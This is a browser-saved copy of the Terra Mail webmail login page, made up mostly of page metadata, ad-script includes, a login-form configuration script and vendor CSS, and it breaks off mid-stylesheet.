<!DOCTYPE html>
<!-- saved from url=(0026)https://mail.terra.com.br/ -->
<html lang="pt-br" xml:lang="pt-br" data-range="xlarge" data-scroll-range="top" data-device-type="web"
	data-device="Computer">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<script type="text/javascript" async="" src="./index_files/publishertag.prebid.js.baixados"></script>
	<!-- Versao da capa webmail Brasil Atz -->

	<title>Terra Mail</title>
	<meta name="description"
		content="Terra Mail Gigante, o maior E-mail da categoria. 20GB de espaco para armazenamento e muitas outras vantagens">
	<meta name="keywords"
		content="Terra Mail Gigante, E-mail com antispam, E-mail com antivirus, E-mail com suporte, E-mail com suporte telefonico, E-mail protegido, E-mail com acesso seguro, email, webmail, antivirus, antispam">
	<link rel="shortcut icon" type="image/x-icon" href="https://s1.trrsf.com.br/terramail/favicon.ico">
	<meta name="expires" content="never">
	<meta name="revisit-after" content="30 days">
	<meta name="robots" content="index,follow">
	<meta name="distribution" content="Global">
	<meta name="title" content="Terra Mail">
	<meta name="rating" content="general">
	<meta name="language" content="pt-br">
	<meta http-equiv="content-language" content="portuguese">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<link rel="shortcut icon" type="image/x-icon" href="https://s1.trrsf.com.br/favicon.ico">
	<!--<link rel="apple-touch-icon" href="_img/ico-bookmark.png" /> -->
	<link rel="stylesheet" type="text/css" href="./index_files/core.css">
	<link rel="stylesheet" type="text/css" href="./index_files/context2.css">
	<link rel="stylesheet" type="text/css" href="./index_files/navbar.css">
	<style>
		#trr-ctn-general {
			width: 970px !important;
			margin: auto;
			background-color: #ffffff;
		}

		.col-right {
			width: 320px;
		}

		.mod-login {
			width: 320px;
			height: 220px
		}

		.adv-area {
			margin: 15px auto;
			width: 300px;
		}
	</style>
	<!-- //PUBLICIDADE -->
	<script src="./index_files/osd.js.baixados"></script>
	<script type="text/javascript" async="" src="./index_files/t3m.js.baixados"></script>
	<script type="text/javascript" language="javascript">
		var tgmKey = 'br.terra_mail.home';
	</script>
	<noscript>
		<p>declaração variavel javascript</p>
	</noscript>
	<script type="text/javascript" src="./index_files/jquery-3.5.1.min.js.baixados"></script>
	<noscript>
		<p>inclusão de arquivo javascript</p>
	</noscript>
	<script src="./index_files/zaz.inline.min.js.baixados"></script>
	<script type="text/javascript" charset="utf-8" src="./index_files/zaz.min.js.baixados"></script>
	<script type="text/javascript">
		zaz.use(function (pkg) {
			'use strict';
			pkg.context.page.set('showBarraSVA', true);
			pkg.context.page.set('showBarraSVAMob', true);
			pkg.context.page.set("mediaService", false);


		});
	</script>

	<script type="text/javascript" src="./index_files/login_sync.js.baixados"> </script>
	<script language="JavaScript" type="text/javascript">
		function HypnoticDaisy(selector) {
			var daisy = {};

			daisy.selector = selector;

			daisy.show = function () {
				$(daisy.selector).css('position', 'relative');
				$(daisy.selector).css('width', $(daisy.selector).width() + 'px');
				$(daisy.selector).css('height', $(daisy.selector).height() + 'px');
				$(daisy.selector).prepend('<div class="hypnotic-daisy-overlay" style="position: absolute; opacity: 0.5; width:100%; height: 100%; background-color: white;">');
			}

			return daisy;
		}



		var secondLogin = LoginClass
			({
				retry: 1,
				retryTimeout: 1000,
				url: "/mail/index.php",
				authenticateAction: "?r=site/login&format=json",
				csrfAction: "?r=site/csrf&format=json",
				captcha: { public_key: "b135776fa1c8ee3ed906d983e60d5b054a91bbd0", lang: 'pt' },
				gCaptchaActive: false,
				gCaptchaKey: '6LfT4LIUAAAAAIx_fIW6iyAnWFm8jCTIF9tdr5gK',
				showCaptchaCallback: function (data, captcha) {
					showErrorMessage(data.message);
					console.log(captcha);
					BrandCaptcha.initAsync(captcha.public_key, "id_captcha", { 'lang': captcha.lang });
				},
				onLoading: function (data) {
					clearErrorMessage();

					var daisy = HypnoticDaisy('.mod-login');
					daisy.show();
				},
				onAnyError: function (data) {
					$('.mod-login .hypnotic-daisy-overlay').remove();
				},
				onAuthenticationError: function (data) {
					showErrorMessage(data.message);
				},
				onSystemError: function (data) {
					if ((typeof data == "object") && data.message != undefined)
						showErrorMessage(data.message);
					else
						showErrorMessage("Sistema temporariamente indispon&iacute;vel");
				},
				onServerError: function (data) {
					showErrorMessage("Sistema temporariamente indispon&iacute;vel");
				}
			});

	</script>
	<noscript>
		<p>inclusão de arquivo javascript</p>
	</noscript>

	<meta name="google-site-verification" content="Ucd00_lyei7eaNyVr9fPb7jFEFQ31bfVKsQFX0slnVI">
	<style type="text/css">
		@media (touch-enabled),
		(-webkit-touch-enabled),
		(-moz-touch-enabled),
		(-o-touch-enabled),
		(-ms-touch-enabled),
		(zaz-touch-identifier) {
			#zaz-touch-identifier {
				top: 9px;
				position: absolute
			}
		}
	</style>
	<script type="text/javascript" async="" charset="utf-8" src="./index_files/ShowArea.aspx"></script>
	<script type="text/javascript" async="" charset="utf-8" src="./index_files/ShowArea(1).aspx"></script>
	<script type="text/javascript" async="" charset="utf-8" src="./index_files/ShowArea(2).aspx"></script>
	<script type="text/javascript" charset="utf-8" src="./index_files/prebid.js.baixados"></script>
	<script type="text/javascript" charset="utf-8" src="./index_files/gpt.js.baixados"></script>
	<style type="text/css">
		/* Terra Networks */
		@font-face {
			font-family: Ubuntu;
			font-display: swap;
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/ubuntu/ubuntu-regular.eot");
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/ubuntu/ubuntu-regular.eot?#iefix") format("embedded-opentype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/ubuntu/ubuntu-regular.woff2") format("woff2"), url("//s1.trrsf.com/fe/zaz-morph/fonts/ubuntu/ubuntu-regular.woff") format("woff"), url("//s1.trrsf.com/fe/zaz-morph/fonts/ubuntu/ubuntu-regular.ttf") format("truetype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/ubuntu/ubuntu-regular.svg#Ubuntu") format("svg");
			font-weight: 400;
			font-style: normal
		}

		@font-face {
			font-family: OpenSans;
			font-display: swap;
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/opensans-regular.woff2") format("woff2"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/opensans-regular.woff") format("woff"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/opensans-regular.eot?#iefix") format("embedded-opentype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/opensans-regular.ttf") format("truetype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/opensans-regular.svg#OpenSansRegular") format("svg");
			font-weight: 400;
			font-style: normal
		}

		@font-face {
			font-family: OpenSans;
			font-display: swap;
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/semibold/opensans-semibold-webfont.eot");
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/semibold/opensans-semibold-webfont.eot?#iefix") format("embedded-opentype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/semibold/opensans-semibold-webfont.woff2") format("woff2"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/semibold/opensans-semibold-webfont.woff") format("woff"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/semibold/opensans-semibold-webfont.ttf") format("truetype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/semibold/opensans-semibold-webfont.svg#open_sanssemibold") format("svg");
			font-weight: 600;
			font-style: normal
		}

		@font-face {
			font-family: OpenSans;
			font-display: swap;
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/bold/opensans-bold-webfont.eot");
			src: url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/bold/opensans-bold-webfont.eot?#iefix") format("embedded-opentype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/bold/opensans-bold-webfont.woff2") format("woff2"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/bold/opensans-bold-webfont.woff") format("woff"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/bold/opensans-bold-webfont.ttf") format("truetype"), url("//s1.trrsf.com/fe/zaz-morph/fonts/opensans/bold/opensans-bold-webfont.svg#open_sansbold") format("svg");
			font-weight: 700;
			font-style: normal
		}

		.zaz--standalone a,
		.zaz--standalone abbr,
		.zaz--standalone acronym,
		.zaz--standalone address,
		.zaz--standalone applet,
		.zaz--standalone article,
		.zaz--standalone aside,
		.zaz--standalone audio,
		.zaz--standalone b,
		.zaz--standalone big,
		.zaz--standalone blockquote,
		.zaz--standalone body,
		.zaz--standalone canvas,
		.zaz--standalone caption,
		.zaz--standalone center,
		.zaz--standalone cite,
		.zaz--standalone code,
		.zaz--standalone dd,
		.zaz--standalone del,
		.zaz--standalone details,
		.zaz--standalone dfn,
		.zaz--standalone div,
		.zaz--standalone dl,
		.zaz--standalone dt,
		.zaz--standalone em,
		.zaz--standalone embed,
		.zaz--standalone fieldset,
		.zaz--standalone figcaption,
		.zaz--standalone figure,
		.zaz--standalone footer,
		.zaz--standalone form,
		.zaz--standalone h1,
		.zaz--standalone h2,
		.zaz--standalone h3,
		.zaz--standalone h4,
		.zaz--standalone h5,
		.zaz--standalone h6,
		.zaz--standalone header,
		.zaz--standalone hgroup,
		.zaz--standalone html,
		.zaz--standalone i,
		.zaz--standalone iframe,
		.zaz--standalone img,
		.zaz--standalone ins,
		.zaz--standalone kbd,
		.zaz--standalone label,
		.zaz--standalone legend,
		.zaz--standalone li,
		.zaz--standalone mark,
		.zaz--standalone menu,
		.zaz--standalone nav,
		.zaz--standalone object,
		.zaz--standalone ol,
		.zaz--standalone output,
		.zaz--standalone p,
		.zaz--standalone pre,
		.zaz--standalone q,
		.zaz--standalone ruby,
		.zaz--standalone s,
		.zaz--standalone samp,
		.zaz--standalone section,
		.zaz--standalone small,
		.zaz--standalone span,
		.zaz--standalone strike,
		.zaz--standalone strong,
		.zaz--standalone sub,
		.zaz--standalone summary,
		.zaz--standalone sup,
		.zaz--standalone table,
		.zaz--standalone tbody,
		.zaz--standalone td,
		.zaz--standalone tfoot,
		.zaz--standalone th,
		.zaz--standalone thead,
		.zaz--standalone time,
		.zaz--standalone tr,
		.zaz--standalone tt,
		.zaz--standalone u,
		.zaz--standalone ul,
		.zaz--standalone var,
		.zaz--standalone video {
			margin: 0;
			padding: 0;
			border: 0;
			font-size: 100%;
			vertical-align: baseline
		}

		.zaz--standalone article,
		.zaz--standalone aside,
		.zaz--standalone details,
		.zaz--standalone figcaption,
		.zaz--standalone figure,
		.zaz--standalone footer,
		.zaz--standalone header,
		.zaz--standalone hgroup,
		.zaz--standalone menu,
		.zaz--standalone nav,
		.zaz--standalone section {
			display: block
		}

		.zaz--standalone ol,
		.zaz--standalone ul {
			list-style: none
		}

		.zaz--standalone blockquote,
		.zaz--standalone q {
			quotes: none
		}

		.zaz--standalone blockquote:after,
		.zaz--standalone blockquote:before,
		.zaz--standalone q:after,
		.zaz--standalone q:before {
			content: '';
			content: none
		}

		.zaz--standalone html {
			font-family: sans-serif;
			-ms-text-size-adjust: 100%;
			-webkit-text-size-adjust: 100%
		}

		.zaz--standalone body {
			margin: 0
		}

		.zaz--standalone article,
		.zaz--standalone aside,
		.zaz--standalone details,
		.zaz--standalone figcaption,
		.zaz--standalone figure,
		.zaz--standalone footer,
		.zaz--standalone header,
		.zaz--standalone hgroup,
		.zaz--standalone main,
		.zaz--standalone nav,
		.zaz--standalone section,
		.zaz--standalone summary {
			display: block
		}

		.zaz--standalone audio,
		.zaz--standalone canvas,
		.zaz--standalone progress,
		.zaz--standalone video {
			display: inline-block;
			vertical-align: baseline
		}

		.zaz--standalone audio:not([controls]) {
			display: none;
			height: 0
		}

		.zaz--standalone [hidden],
		.zaz--standalone template {
			display: none
		}

		.zaz--standalone a {
			background-color: transparent
		}

		.zaz--standalone a:active,
		.zaz--standalone a:hover {
			outline: 0
		}

		.zaz--standalone abbr[title] {
			border-bottom: 1px dotted
		}

		.zaz--standalone b,
		.zaz--standalone strong {
			font-weight: 700
		}

		.zaz--standalone dfn {
			font-style: italic
		}

		.zaz--standalone h1 {
			font-size: 2em;
			margin: .67em 0
		}

		.zaz--standalone mark {
			background: #ff0;
			color: #000
		}

		.zaz--standalone small {
			font-size: 80%
		}

		.zaz--standalone sub,
		.zaz--standalone sup {
			font-size: 75%;
			line-height: 0;
			position: relative;
			vertical-align: baseline
		}

		.zaz--standalone sup {
			top: -.5em
		}

		.zaz--standalone sub {
			bottom: -.25em
		}

		.zaz--standalone img {
			border: 0
		}

		.zaz--standalone svg:not(:root) {
			overflow: hidden
		}

		.zaz--standalone figure {
			margin: 1em 40px
		}

		.zaz--standalone hr {
			-moz-box-sizing: content-box;
			box-sizing: content-box;
			height: 0
		}

		.zaz--standalone pre {
			overflow: auto
		}

		.zaz--standalone code,
		.zaz--standalone kbd,
		.zaz--standalone pre,
		.zaz--standalone samp {
			font-family: monospace, monospace;
			font-size: 1em
		}

		.zaz--standalone button,
		.zaz--standalone input,
		.zaz--standalone optgroup,
		.zaz--standalone select,
		.zaz--standalone textarea {
			color: inherit;
			font: inherit;
			margin: 0
		}

		.zaz--standalone button {
			overflow: visible
		}

		.zaz--standalone button,
		.zaz--standalone select {
			text-transform: none
		}

		.zaz--standalone button,
		.zaz--standalone html input[type=button],
		.zaz--standalone input[type=reset],
		.zaz--standalone input[type=submit] {
			-webkit-appearance: button;
			cursor: pointer
		}

		.zaz--standalone button[disabled],
		.zaz--standalone html input[disabled] {
			cursor: default
		}

		.zaz--standalone button::-moz-focus-inner,
		.zaz--standalone input::-moz-focus-inner {
			border: 0;
			padding: 0
		}

		.zaz--standalone input {
			line-height: normal
		}

		.zaz--standalone input[type=checkbox],
		.zaz--standalone input[type=radio] {
			box-sizing: border-box;
			padding: 0
		}

		.zaz--standalone input[type=number]::-webkit-inner-spin-button,
		.zaz--standalone input[type=number]::-webkit-outer-spin-button {
			height: auto
		}

		.zaz--standalone input[type=search] {
			-webkit-appearance: textfield;
			-moz-box-sizing: content-box;
			-webkit-box-sizing: content-box;
			box-sizing: content-box
		}

		.zaz--standalone input[type=search]::-webkit-search-cancel-button,
		.zaz--standalone input[type=search]::-webkit-search-decoration {
			-webkit-appearance: none
		}

		.zaz--standalone fieldset {
			border: 1px solid silver;
			margin: 0 2px;
			padding: .35em .625em .75em
		}

		.zaz--standalone legend {
			border: 0;
			padding: 0
		}

		.zaz--standalone textarea {
			overflow: auto
		}

		.zaz--standalone optgroup {
			font-weight: 700
		}

		.zaz--standalone table {
			border-collapse: collapse;
			border-spacing: 0
		}

		.zaz--standalone td,
		.zaz--standalone th {
			padding: 0
		}

		.root-container {
			font-size: 10px;
			line-height: 16px
		}

		.zaz--standalone {
			font-size: 10px;
			font-family: OpenSans, sans-serif;
			line-height: 12px;
			-webkit-font-smoothing: antialiased;
			-moz-osx-font-smoothing: grayscale
		}

		.zaz--standalone *,
		.zaz--standalone ::after,
		.zaz--standalone ::before,
		.zaz--standalone :after,
		.zaz--standalone :before {
			-ms-box-sizing: border-box;
			-moz-box-sizing: border-box;
			box-sizing: border-box
		}

		.zaz--standalone * html:before {
			content: 'Terra Networks';
			font: 0/0 Ubuntu;
			position: fixed
		}

		.zaz--standalone li,
		.zaz--standalone ul {
			list-style: none;
			margin: 0;
			padding: 0
		}

		.zaz--standalone>* {
			font-size: 16px
		}

		.zaz--standalone .seoTitle {
			font: 0/0 OpenSans, sans-serif
		}

		.zaz--standalone .zaz__loader {
			width: 32px;
			height: 32px;
			display: inline-block;
			background: url("//s1.trrsf.com/fe/zaz-icons/gif/loader.gif");
			background-repeat: no-repeat
		}

		.zaz--standalone .headline,
		.zaz--standalone .subtitle--L,
		.zaz--standalone .subtitle--M,
		.zaz--standalone .subtitle--S,
		.zaz--standalone .subtitle--XS {
			font-family: OpenSans, sans-serif;
			font-weight: 600;
			color: #191917;
			cursor: pointer
		}

		.zaz--standalone .headline:focus,
		.zaz--standalone .headline:hover,
		.zaz--standalone .subtitle--L:focus,
		.zaz--standalone .subtitle--L:hover,
		.zaz--standalone .subtitle--M:focus,
		.zaz--standalone .subtitle--M:hover,
		.zaz--standalone .subtitle--S:focus,
		.zaz--standalone .subtitle--S:hover,
		.zaz--standalone .subtitle--XS:focus,
		.zaz--standalone .subtitle--XS:hover {
			opacity: .8
		}

		.zaz--standalone .headline {
			font-size: 22px;
			font-family: Ubuntu, OpenSans, sans-serif;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		html[data-range=medium] .zaz--standalone .headline,
		html[data-range=small] .zaz--standalone .headline,
		html[data-range=xsmall] .zaz--standalone .headline {
			font-size: 34px
		}

		html[data-range=large] .zaz--standalone .headline,
		html[data-range=xlarge] .zaz--standalone .headline {
			font-size: 36px
		}

		.zaz--standalone .headlinePic {
			font-size: 40px
		}

		.zaz--standalone .subtitle--L {
			font-size: 32px;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .subtitle--M {
			font-size: 22px;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .subtitle--S {
			font-size: 16px;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .subtitle--XS {
			font-size: 14px;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .quote {
			font-family: Ubuntu, OpenSans, sans-serif;
			line-height: 1.4px;
			font-size: 22px;
			color: #33332f;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		html[data-range=large] .zaz--standalone .quote,
		html[data-range=xlarge] .zaz--standalone .quote {
			font-size: 30px
		}

		.zaz--standalone .quote:after,
		.zaz--standalone .quote:before {
			position: relative;
			top: 10px;
			content: '';
			display: inline-block
		}

		.zaz--standalone .article__txt {
			display: block;
			color: #33332f;
			font-size: 14px;
			line-height: 1.4px;
			margin-bottom: 2em;
			clear: both;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .article__txt:first-of-type:first-letter {
			float: left;
			margin: 2px 10px 0 0;
			font-size: 60px;
			font-weight: 700;
			line-height: .7px
		}

		html[data-range=medium] .zaz--standalone .article__txt:first-of-type:first-letter {
			font-size: 90px;
			margin-top: 4px
		}

		html[data-range=large] .zaz--standalone .article__txt:first-of-type:first-letter,
		html[data-range=xlarge] .zaz--standalone .article__txt:first-of-type:first-letter {
			font-size: 92px;
			margin-top: 4px
		}

		.zaz--standalone .article__link {
			padding: 0 .2em;
			color: #33332f;
			text-decoration: underline;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .article__link:hover {
			background-color: #ff7212;
			color: #fff;
			text-decoration: none
		}

		.zaz--standalone .article__excerpt {
			color: #65655d;
			line-height: 1.4px;
			font-size: 16px;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .article__excerpt html[data-range=medium] {
			font-size: 20px
		}

		html[data-range=large] .zaz--standalone .article__excerpt,
		html[data-range=xlarge] .zaz--standalone .article__excerpt {
			font-size: 22px
		}

		.zaz--standalone .btn--branding,
		.zaz--standalone .btn--default,
		.zaz--standalone .btn--important,
		.zaz--standalone .btn--notification,
		.zaz--standalone .btn--social,
		.zaz--standalone .btn--sva {
			font-size: 16px;
			font-family: Ubuntu, OpenSans, sans-serif;
			padding: 10px 20px;
			text-decoration: none;
			text-align: center;
			border-radius: 3px;
			cursor: pointer;
			border: none;
			display: inline-block;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.zaz--standalone .btn--branding:focus,
		.zaz--standalone .btn--branding:hover,
		.zaz--standalone .btn--default:focus,
		.zaz--standalone .btn--default:hover,
		.zaz--standalone .btn--important:focus,
		.zaz--standalone .btn--important:hover,
		.zaz--standalone .btn--notification:focus,
		.zaz--standalone .btn--notification:hover,
		.zaz--standalone .btn--social:focus,
		.zaz--standalone .btn--social:hover,
		.zaz--standalone .btn--sva:focus,
		.zaz--standalone .btn--sva:hover {
			opacity: .8
		}

		.zaz--standalone .btn--default {
			color: #65655d;
			background-color: #fff;
			border: solid 1px #d7d7d7
		}

		.zaz--standalone .btn--default:focus,
		.zaz--standalone .btn--default:hover {
			background-color: #d7d7d7
		}

		.zaz--standalone .btn--branding {
			color: #fff;
			background-color: #ff7212
		}

		.zaz--standalone .btn--important {
			color: #fff;
			background-color: #ff290b
		}

		.zaz--standalone .btn--social {
			color: #fff;
			background-color: #245be7
		}

		.zaz--standalone .btn--notification {
			color: #fff;
			background-color: #50bc37
		}

		.zaz--standalone .btn--sva {
			color: #fff;
			background-color: #ffce1e
		}

		.zaz--standalone .btn--large {
			font-size: 18px;
			padding: 18px 25px
		}

		.zaz--standalone .btn--small {
			font-size: 15px;
			padding: 8px 15px
		}

		.zaz--standalone .btn--xsmall {
			font-size: 14px;
			padding: 5px 10px
		}

		.zaz--standalone .txtDialog {
			font-size: 15px;
			padding: .25em 1em;
			color: #65655d;
			border-radius: 40px;
			border: solid 1px #d7d7d7;
			font-style: italic
		}

		.zaz--standalone .txtDialog:focus {
			color: #33332f;
			font-style: normal;
			outline: 0
		}

		.zaz--standalone .txtDialog[readonly] {
			background-color: #f1f1f1;
			color: #65655d;
			cursor: not-allowed
		}

		.zaz--standalone .txtDialog[readonly]:focus {
			font-style: italic
		}

		.zaz--standalone .txtDialog--large {
			padding: 15px 10px
		}

		.zaz--standalone .txtDialog--xlarge {
			font-size: 16px;
			padding: 20px 10px
		}

		.nightmode {
			background-color: #191917
		}

		/*# sourceURL=https://s1.trrsf.com/update-1542656221/fe/zaz-morph/_css/zazstandalone.min.css */
	</style>
	<style type="text/css">
		/* Terra Networks */
		.zaz--standalone .mail_branding_white24,
		.zaz--standalone .menu_burger,
		.zaz--standalone .nb-plugin>.icon {
			display: inline-block
		}

		.zaz--standalone .nb-plugin {
			position: relative
		}

		.zaz--standalone .nb-plugin:before {
			content: '';
			position: absolute;
			left: 50%;
			bottom: 0;
			width: 0;
			height: 0;
			border-top: solid 5px transparent;
			border-right: solid 5px transparent;
			border-left: solid 5px transparent;
			border-bottom: solid 5px #fff;
			margin-left: -5px;
			display: none
		}

		.zaz--standalone .nb-plugin.arrowOn:before {
			display: block
		}

		[data-range=xsmall] .zaz--standalone #zaz-nb-plugin-search {
			display: none
		}

		[data-range=xsmall] .zaz--standalone [data-small-search=visible] #zaz-nb-plugin-search {
			display: block
		}

		[data-range=xsmall] .zaz--standalone [data-small-search=visible] .za-search-component {
			position: absolute;
			background-color: #ff7212;
			width: 220px;
			height: 100%
		}

		.zaz--standalone #zaz-nb-plugin-search {
			z-index: 9;
			display: none
		}

		.zaz--standalone html[data-scroll-range] .nb__breadcrumb {
			transition: top .2s;
			top: -134px
		}

		.zaz--standalone html[data-scroll-range=top] .nb__breadcrumb {
			transition: top .2s, z-index 800ms;
			top: 0
		}

		.zaz--standalone .nb__breadcrumb {
			width: 100%;
			padding: 2px 0 2px 20px;
			background: #e4e4e4;
			overflow: hidden;
			position: relative;
			z-index: 0
		}

		.zaz--standalone .nb__breadcrumb li {
			float: left;
			line-height: 25px
		}

		.zaz--standalone .nb__breadcrumb li .arrow {
			position: relative;
			opacity: .5;
			top: 2px;
			margin: 0 17px
		}

		.zaz--standalone .nb__breadcrumb li:last-of-type .arrow {
			display: none
		}

		.zaz--standalone .nb__breadcrumb li a {
			display: inline-block;
			color: #63645e;
			font-size: 13px;
			text-decoration: none;
			text-transform: lowercase
		}

		.zaz--standalone .nb__breadcrumb li a:hover {
			opacity: .7
		}

		.zaz--standalone .nb__breadcrumb__link:focus,
		.zaz--standalone .nb__breadcrumb__link:hover {
			text-decoration: underline
		}

		.zaz--standalone .zaz-sva-container {
			z-index: 1
		}

		.zaz--standalone .nb__sva {
			height: 40px;
			line-height: 38px;
			background-color: #fff;
			box-shadow: 0 1px 0 0 rgba(0, 0, 0, .2);
			position: relative;
			top: 0;
			transition: .3s
		}

		.zaz--standalone .nb__sva .mfa-bar {
			position: absolute;
			left: 0;
			bottom: 0;
			width: 830px;
			height: 4px;
			background-color: #fc0
		}

		.zaz--standalone .nb__sva ul {
			margin-left: 5px;
			overflow: hidden;
			height: 47px;
			padding: 0 295px 0 195px;
			position: relative;
			display: block
		}

		.zaz--standalone .nb__sva li {
			margin: 2px 10px 0;
			display: inline-block;
			opacity: 1;
			transition: .5s;
			height: 40px;
			vertical-align: top;
			position: relative
		}

		.zaz--standalone .nb__sva li .icon.icon-sva-revistas-digitais {
			background-size: 14px auto;
			width: 14px
		}

		.zaz--standalone .nb__sva li a {
			color: #65655d;
			text-decoration: none;
			display: inline-block
		}

		.zaz--standalone .nb__sva li a .class-icon {
			display: inline-block;
			margin-top: 8px;
			margin-right: 7px
		}

		.zaz--standalone .nb__sva li a .tag {
			background-image: url("https://svadata.terra.com.br/svabar-navbar/promotags/tag_2021.png");
			display: block;
			background-repeat: no-repeat;
			background-size: 70px auto;
			position: absolute;
			bottom: -9px;
			right: 0;
			width: 70px;
			height: 20px
		}

		.zaz--standalone .nb__sva li a .novidade {
			background-image: url("http://svadata.terra.com.br/svabar-navbar/zaz-navbar-desk/novidade.svg") !important;
			display: block;
			background-repeat: no-repeat;
			background-size: 66px auto;
			position: absolute;
			bottom: -5px;
			right: 0;
			width: 66px;
			height: 14px
		}

		.zaz--standalone .nb__sva li .promo-ticket {
			height: 14px;
			display: block;
			margin-top: -14px;
			margin-left: 6px;
			background-color: #ff2500;
			line-height: 11px;
			padding: 0 0 0 2px;
			text-transform: uppercase
		}

		.zaz--standalone .nb__sva li .promo-ticket img {
			display: block
		}

		.zaz--standalone .nb__sva li .promo-ticket .dot {
			font-size: 11px;
			position: relative;
			bottom: 6px;
			right: 7px
		}

		.zaz--standalone .nb__sva li .promo-ticket span {
			font-family: OpenSans;
			font-size: 11px;
			color: #fff;
			font-weight: 700;
			position: relative;
			bottom: 3px;
			right: 4px
		}

		.zaz--standalone .nb__sva li .promo-ticket:before {
			content: '';
			position: relative;
			right: 5px;
			bottom: 0;
			width: 0;
			height: 0;
			border-top: solid .7rem transparent;
			border-right: solid .6rem #ff2500;
			border-left: solid .7rem transparent;
			border-bottom: solid .7rem transparent;
			margin-left: -1rem;
			display: inline-block
		}

		.zaz--standalone .nb__sva li.line-separator {
			background: #ececec;
			width: 1px;
			height: 30px;
			margin: 5px 2px
		}

		.zaz--standalone .nb__sva li.sva-item-8 .promo-ticket {
			width: 72px
		}

		.zaz--standalone .nb__sva li .promo-ticket-gif {
			height: 14px;
			display: block;
			margin-top: -14px;
			padding: 0 0 0 2px
		}

		.zaz--standalone .nb__sva li .promo-ticket-gif img {
			display: block
		}

		.zaz--standalone .nb__sva li:hover {
			opacity: .8;
			transition: .5s
		}

		.zaz--standalone .nb__sva .class-text,
		.zaz--standalone .nb__sva p {
			font-family: Ubuntu;
			font-size: 12px;
			display: inline-block;
			line-height: 0;
			vertical-align: top;
			margin-top: 19px;
			text-transform: uppercase
		}

		.zaz--standalone .nb__sva .terra-fibra {
			color: #75459B !important
		}

		.zaz--standalone .nb__sva .mail-gigante {
			color: #ec7404
		}

		.zaz--standalone .nb__sva .backup {
			color: #e2001a
		}

		.zaz--standalone .nb__sva .cursos-online {
			color: #007072
		}

		.zaz--standalone .nb__sva .antivirus {
			color: #af0917
		}

		.zaz--standalone .nb__sva .resolve {
			color: #f49e00
		}

		.zaz--standalone .nb__sva .reforco-escolar {
			color: #00787f
		}

		.zaz--standalone .nb__sva .curso-de-ingles {
			color: #57bab1
		}

		.zaz--standalone .nb__sva .curso-profissionalizantes {
			color: #0087a8
		}

		.zaz--standalone .nb__sva .concurso-publico {
			color: #00afdb
		}

		.zaz--standalone .nb__sva .cursinho-online {
			color: #007f66
		}

		.zaz--standalone .nb__sva .musica {
			color: #a64d94
		}

		.zaz--standalone .nb__sva .nuvem-de-livros {
			color: #0092c8
		}

		.zaz--standalone .nb__sva .goread {
			color: #0092c7
		}

		.zaz--standalone .nb__sva .construtor-de-sites {
			color: #1b7fc8
		}

		.zaz--standalone .nb__sva .loja-virtual {
			color: #3b91e6
		}

		.zaz--standalone .nb__sva .checkout {
			color: #5baee9
		}

		.zaz--standalone .nb__sva .dominio {
			color: #d40b1c
		}

		.zaz--standalone .nb__sva .hospedagem {
			color: #c20a19
		}

		.zaz--standalone .nb__sva .email-profissional {
			color: #af0917
		}

		.zaz--standalone .nb__sva .antivirus-empresarial {
			color: #a64d94
		}

		.zaz--standalone .nb__sva .office365 {
			color: #b1569e
		}

		.zaz--standalone .nb__sva .terra-ads {
			color: #66af24
		}

		.zaz--standalone .nb__sva .assistencia {
			color: #f49e00
		}

		.zaz--standalone .nb__sva .more-services {
			width: 120px !important;
			background-size: 90% !important;
			margin-left: 5px !important
		}

		.zaz--standalone .nb__sva .all-sva-services {
			cursor: pointer;
			position: absolute;
			left: 8px;
			top: 0;
			padding-top: 2px;
			background-color: #fff;
			height: 40px
		}

		.zaz--standalone .nb__sva .all-sva-services a {
			display: inline-block
		}

		.zaz--standalone .nb__sva .all-sva-services .small-icon {
			background-size: 80%
		}

		.zaz--standalone .nb__sva .all-sva-services .invert-icon {
